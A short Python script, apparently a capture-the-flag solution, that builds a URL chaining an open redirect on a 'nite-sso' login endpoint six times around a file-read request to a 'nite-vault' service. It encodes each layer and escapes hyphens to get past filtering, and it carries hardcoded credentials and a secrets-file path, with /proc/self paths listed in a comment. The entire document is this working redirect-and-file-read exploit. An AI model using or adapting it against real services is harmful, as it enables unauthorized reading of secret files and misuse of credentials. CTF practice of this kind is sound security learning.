from urllib.parse import quote

'''
/proc/self/uid_map 0
/proc/self/gid_map 0
/proc/self/status 17
/app/nite-vault/secrets/7cbc38fc6a043f99.txt
'''

redirect = 'http://nite-sso/doLogin?username=meow123&password=meow123&redirect_url='
file_read = 'http://nite-vault/view?username=qwertyuiop&password=SgYJBS9C1b1ohbazlE&filename=/app/nite-vault/secrets/7cbc38fc6a043f99.txt#'

malicious_url = file_read

for i in range(6):
    malicious_url = redirect + quote(malicious_url, safe='').replace('-', '%2D')

print(malicious_url)
